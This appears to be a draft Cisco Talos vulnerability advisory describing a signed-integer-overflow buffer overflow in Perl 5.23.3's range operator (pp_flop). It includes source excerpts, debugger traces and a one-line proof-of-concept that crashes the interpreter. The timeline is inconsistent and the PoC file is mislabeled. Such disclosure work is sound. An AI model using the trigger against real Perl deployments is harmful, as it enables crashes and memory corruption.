Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Perl pp_flop (range operator) buffer overflow vulnerabilities.

:: Description

Buffer overflow appears in pp_flop (range operator) ".." because of improper boundary check. 
Wrong boundary check again overflow (too big range size) causes later in consequences 
no increase of mortal stack and regular scalar stack. Finally, further range elements are pushed into stack 
with too small capacity leading to buffer overflow.


:: Tested Versions

Perl (v5.23.3) built for MSWin32-x86-multi-thread

:: Product URLs

https://www.perl.org/


:: Description

To understand vulnerability nature, let we see vulnerable code:

---------------------------------- pp_ctl.c ----------------------------------------
Line 1182	PP(pp_flop)
Line 1183	{
Line 1184		dSP;
Line 1185
Line 1186		if (GIMME_V == G_ARRAY) {
Line 1187		dPOPPOPssrl;
Line 1188
Line 1189		SvGETMAGIC(left);
Line 1190		SvGETMAGIC(right);
Line 1191
Line 1192		if (RANGE_IS_NUMERIC(left,right)) {
Line 1193			IV i, j, n;
Line 1194			if ((SvOK(left) && !SvIOK(left) && SvNV_nomg(left) < IV_MIN) ||
Line 1195			(SvOK(right) && (SvIOK(right)
Line 1196					 ? SvIsUV(right) && SvUV(right) > IV_MAX
Line 1197					 : SvNV_nomg(right) > IV_MAX)))
Line 1198			DIE(aTHX_ "Range iterator outside integer range");
Line 1199			i = SvIV_nomg(left);
Line 1200			j = SvIV_nomg(right);
Line 1201			if (j >= i) {
Line 1202					/* Dance carefully around signed max. */
Line 1203					bool overflow = (i <= 0 && j > SSize_t_MAX + i - 1);
Line 1204					if (!overflow) {
Line 1205						n = j - i + 1;
Line 1206						/* The wraparound of signed integers is undefined
Line 1207						 * behavior, but here we aim for count >=1, and
Line 1208						 * negative count is just wrong. */
Line 1209						if (n < 1
Line 1210	#if IVSIZE > Size_t_size
Line 1211							|| n > SSize_t_MAX
Line 1212	#endif
Line 1213							)
Line 1214							overflow = TRUE;
Line 1215					}
Line 1216					if (overflow)
Line 1217						Perl_croak(aTHX_ "Out of memory during list extend");
Line 1218			EXTEND_MORTAL(n);
Line 1219			EXTEND(SP, n);
Line 1220			}
Line 1221			else
Line 1222			n = 0;
Line 1223			while (n--) {
Line 1224			SV * const sv = sv_2mortal(newSViv(i));
Line 1225			PUSHs(sv);
Line 1226					if (n) /* avoid incrementing above IV_MAX */
Line 1227						i++;
Line 1228			}
---------------------------------- pp_ctl.c ----------------------------------------

As range example we will take range which triggers buffer overflow :
(1..0x7fffffff)
Ok, in line from 1194 to 1209 range boundry values represented by signed integer "i" (low range = 1) and "j" (highest  = 0x7fffffff) are check
in all different kind of ways, but at the end we don't know why and for what? One product which comes out from calculation where i and j is used is n
(line 1205). Its check again signed integer overflow but in conext of presented vulnerability brings nothing. Entire problem is hiding inside 
macros responsible of extending stacks and maximum value "n" can have.
Executing script with presented above range we end up in line 1218 with "n" value equal 0x7fffffff (INT_MAX).
Let we take a glance on this macro:
---------------------------------- pp.h ----------------------------------------
Line 406	#define EXTEND_MORTAL(n) \
Line 407		STMT_START {						\
Line 408		SSize_t eMiX = PL_tmps_ix + (n);			\
Line 409		if (UNLIKELY(eMiX >= PL_tmps_max))			\
Line 410			(void)Perl_tmps_grow_p(aTHX_ eMiX);			\
Line 411		} STMT_END
---------------------------------- pp.h ----------------------------------------

passed "n" is added to PL_tmps_ix ( I assume it is current size of mortal stack ) 
0:000> dt my_perl Itmps_ix
Local var @ 0x44f7c0 Type interpreter*
0x053ee53c 
   +0x030 Itmps_ix : 0n14

and later this sum is compare to current max size of stack PL_tmps_max:
0:000> dt my_perl Itmps_max
Local var @ 0x44f7c0 Type interpreter*
0x053ee53c 
   +0x038 Itmps_max : 0n257

Algorithm looks ok at first sight, but we don't see here check against signed integer overflow !.
And for our "n" value it appears :

0:000> ?0x7fffffff+0n14
Evaluate expression: -2147483635 = 8000000d

eMiX is signed integer  (SSize_t) so at the end condition is false and stack is not increased.
Ok, let we check second macro:

Line 299	# define EXTEND(p,n)   STMT_START {                                     \
Line 300							 if (UNLIKELY(PL_stack_max - p < (SSize_t)(n))) { \
Line 301							   sp = stack_grow(sp,p,(SSize_t) (n));         \
Line 302							   PERL_UNUSED_VAR(sp);                         \
Line 303							 } } STMT_END

this time space which left free on stack is taken into account, lack of signed integer overflow and 
correctly condition is passed. Next we see call to stack_grow with parapeters like:
*this
sp,p   - current stack pointers
n

Let we see their value:
0:000> p
eax=07125dfc ebx=00000000 ecx=053ee53c edx=07125dfc esi=00000001 edi=00000000
eip=540058ec esp=0044f6cc ebp=0044f7b8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
perl523!Perl_pp_flop+0x5dc:
540058ec e8ebc6f2ff      call    perl523!ILT+4055(_Perl_stack_grow) (53f31fdc)
0:000> dd esp
0044f6cc  053ee53c 07125dfc 07125dfc 7fffffff

let we take a glance at current stack size :
from calculations:
0:000> dt my_perl Istack_max
Local var @ 0x44f7c0 Type interpreter*
0x053ee53c 
   +0x010 Istack_max : 0x07125ff8  -> 0xc0c0c0c0 sv
0:000> ?0x07125ff8 - 0x07125dfc 
Evaluate expression: 508 = 000001fc

and real available size on heap:

!heap -p -a 07125dfc 

    address 07125dfc found in
    _DPH_HEAP_ROOT @ 551000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 70f1208:          7125df0              20c -          7125000             2000
    60798e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
    7710134e ntdll!RtlDebugAllocateHeap+0x00000030
    770bb16e ntdll!RtlpAllocateHeap+0x000000c4
    77062fe3 ntdll!RtlAllocateHeap+0x0000023a
    0f9eed63 MSVCR120!malloc+0x00000049
    54144fee perl523!VMem::Malloc+0x0000001e [t:\projects\bugs\perl5\win32\vmem.h @ 151]
    5414c9f9 perl523!CPerlHost::Malloc+0x00000019 [t:\projects\bugs\perl5\win32\perlhost.h @ 62]
    54147a0a perl523!PerlMemMalloc+0x0000001a [t:\projects\bugs\perl5\win32\perlhost.h @ 297]
    5413ebfb perl523!Perl_safesysmalloc+0x0000004b [t:\projects\bugs\perl5\util.c @ 153]
    53f37221 perl523!Perl_av_extend_guts+0x000002a1 [t:\projects\bugs\perl5\av.c @ 182]
    53f36f6d perl523!Perl_av_extend+0x0000010d [t:\projects\bugs\perl5\av.c @ 80]
    540ba8e7 perl523!Perl_new_stackinfo+0x00000067 [t:\projects\bugs\perl5\scope.c @ 56]
    53fc81e6 perl523!Perl_init_stacks+0x00000016 [t:\projects\bugs\perl5\win32\perl.c @ 4064]
    53fc9713 perl523!perl_construct+0x00000083 [t:\projects\bugs\perl5\win32\perl.c @ 249]
    54144bfb perl523!RunPerl+0x000000db [t:\projects\bugs\perl5\win32\perllib.c @ 238]
    00a41036 perl!main+0x00000026 [t:\projects\bugs\perl5\win32\perlmain.c @ 39]
    00a41256 perl!__tmainCRTStartup+0x000000fd [f:\dd\vctools\crt\crtw32\dllstuff\crtexe.c @ 626]
    76b0336a kernel32!BaseThreadInitThunk+0x0000000e
    77069882 ntdll!__RtlUserThreadStart+0x00000070
    77069855 ntdll!_RtlUserThreadStart+0x0000001b

For this moment everything goes well inside this macro, let we step inside Perl_stack_grow:
Line 29	SV**
Line 30	Perl_stack_grow(pTHX_ SV **sp, SV **p, SSize_t n)
Line 31	{
Line 32		PERL_ARGS_ASSERT_STACK_GROW;
Line 33
Line 34		PL_stack_sp = sp;
Line 35	#ifndef STRESS_REALLOC
Line 36		av_extend(PL_curstack, (p - PL_stack_base) + (n) + 128);
Line 37	#else
Line 38		av_extend(PL_curstack, (p - PL_stack_base) + (n) + 1);
Line 39	#endif
Line 40		return PL_stack_sp;
Line 41	}

if we did not compile perl with STRESS_REALLOC flag line 36 is executed.
We see there that our stack in fact is represented by array and its new size will be calculated based on :
(p - PL_stack_base) + (n) + 128
Again, no (signed) integer overflow check!. Going further:

Line 64	void
Line 65	Perl_av_extend(pTHX_ AV *av, SSize_t key)
Line 66	{
Line 67		MAGIC *mg;
Line 68
Line 69		PERL_ARGS_ASSERT_AV_EXTEND;
Line 70		assert(SvTYPE(av) == SVt_PVAV);
Line 71
Line 72		mg = SvTIED_mg((const SV *)av, PERL_MAGIC_tied);
Line 73		if (mg) {
Line 74		SV *arg1 = sv_newmortal();
Line 75		sv_setiv(arg1, (IV)(key + 1));
Line 76		Perl_magic_methcall(aTHX_ MUTABLE_SV(av), mg, SV_CONST(EXTEND), G_DISCARD, 1,
Line 77					arg1);
Line 78		return;
Line 79		}
Line 80		av_extend_guts(av,key,&AvMAX(av),&AvALLOC(av),&AvARRAY(av));
Line 81	}    
Line 82
Line 83	/* The guts of av_extend.  *Not* for general use! */
Line 84	void
Line 85	Perl_av_extend_guts(pTHX_ AV *av, SSize_t key, SSize_t *maxp, SV ***allocp,
Line 86				  SV ***arrayp)
Line 87	{
Line 88		PERL_ARGS_ASSERT_AV_EXTEND_GUTS;
Line 89
Line 90		if (key > *maxp) {

We end up with calculation result (key value ) eq to :

0:000> .formats poi(key)
Evaluate expression:
  Hex:     8000007f
  Decimal: -2147483521

From Perl_av_extend key is passed to av_extend_guts and there still being represented as sign value is compared with current
maximum value of tack. As You can imagine its value in this comparison is smaller than maximum stack value and stack is not increased.
0:000> .formats poi(poi(maxp))
Evaluate expression:
  Hex:     0000007f
  Decimal: 127

In result, both stacks size have not been increased!!!
Going back to pp_flop:

Line 1223			while (n--) {
Line 1224			SV * const sv = sv_2mortal(newSViv(i));
Line 1225			PUSHs(sv);

Based on "n" size further elements from range are pushing into stack ( general stack, handled by second macro EXTEND )
which in consequences lead to buffer overflow.

:: PoC

---------------------------------- PoC test.rb ----------------------------------------

print (1..0x7fffffff);
---------------------------------- PoC test.rb ----------------------------------------

:: Debugger analysis

FAULTING_IP: 
perl523!Perl_pp_flop+644 [t:\projects\bugs\perl5\pp_ctl.c @ 1225]
54005954 8908            mov     dword ptr [eax],ecx

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 54005954 (perl523!Perl_pp_flop+0x00000644)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000001
   Parameter[1]: 07126000
Attempt to write to address 07126000

FAULTING_THREAD:  000026d0

DEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE

PROCESS_NAME:  perl.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000001

EXCEPTION_PARAMETER2:  07126000

WRITE_ADDRESS:  07126000 

FOLLOWUP_IP: 
perl523!Perl_pp_flop+644 [t:\projects\bugs\perl5\pp_ctl.c @ 1225]
54005954 8908            mov     dword ptr [eax],ecx

DETOURED_IMAGE: 1

FAULTING_LOCAL_VARIABLE_NAME:  sp

APP:  perl.exe

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 540b8ffb to 54005954

STACK_TEXT:  
0044f7b8 540b8ffb 053ee53c 0712cf80 0d2ed7c8 perl523!Perl_pp_flop+0x644
0044f7cc 53fae271 053ee53c 053ee53c 0d2ed7e8 perl523!Perl_runops_standard+0x1b
0044f7f4 53f9b684 053ee53c 0d2ed7a8 0044f820 perl523!S_gen_constant_list+0xc1
0044f818 53fae77d 053ee53c 0d2ed7a8 0d2ed7a8 perl523!Perl_list+0x2b4
0044f82c 53f96af1 053ee53c 0d2ed784 00000000 perl523!S_listkids+0x3d
0044f844 53fa4d81 053ee53c 0d2ed784 0d2ed808 perl523!Perl_ck_listiob+0x191
0044f85c 53fd4627 053ee53c 000000ee 00000000 perl523!Perl_op_convert_list+0x1b1
0044f904 53fcf21c 053ee53c 00000102 00000002 perl523!Perl_yyparse+0x24b7
0044f980 53fcb8fc 053ee53c 06f04f18 54144ef0 perl523!S_parse_body+0xdac
0044fa24 54144c3d 053ee53c 54144ef0 00000002 perl523!perl_parse+0x5dc
0044fc64 00a41036 00000002 005b6fb0 06f04f18 perl523!RunPerl+0x11d
0044fc7c 00a41256 00000002 005b6fb0 06fdcf18 perl!main+0x26
0044fcbc 76b0336a 7efde000 0044fd08 77069882 perl!__tmainCRTStartup+0xfd
0044fcc8 77069882 7efde000 780ab94b 00000000 kernel32!BaseThreadInitThunk+0xe
0044fd08 77069855 00a41304 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0044fd20 00000000 00a41304 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


FAULTING_SOURCE_LINE:  t:\projects\bugs\perl5\pp_ctl.c

FAULTING_SOURCE_FILE:  t:\projects\bugs\perl5\pp_ctl.c

FAULTING_SOURCE_LINE_NUMBER:  1225

FAULTING_SOURCE_CODE:  
  1221: 	    else
  1222: 		n = 0;
  1223: 	    while (n--) {
  1224: 		SV * const sv = sv_2mortal(newSViv(i));
> 1225: 		PUSHs(sv);
  1226:                 if (n) /* avoid incrementing above IV_MAX */
  1227:                     i++;
  1228: 	    }
  1229: 	}
  1230: 	else {


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  perl523!Perl_pp_flop+644

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: perl523

IMAGE_NAME:  perl523.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  55f1a9ae

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_perl523.dll!Perl_pp_flop

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_DETOURED_perl523!Perl_pp_flop+644

Followup: MachineOwner
---------

0:000> r
eax=07126000 ebx=00000000 ecx=0d1e0b2c edx=07126000 esi=00000001 edi=00000000
eip=54005954 esp=0044f6dc ebp=0044f7b8 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
perl523!Perl_pp_flop+0x644:
54005954 8908            mov     dword ptr [eax],ecx  ds:002b:07126000=????????


:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Cisco TALOS.

:: Timeline

2015-09-24 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure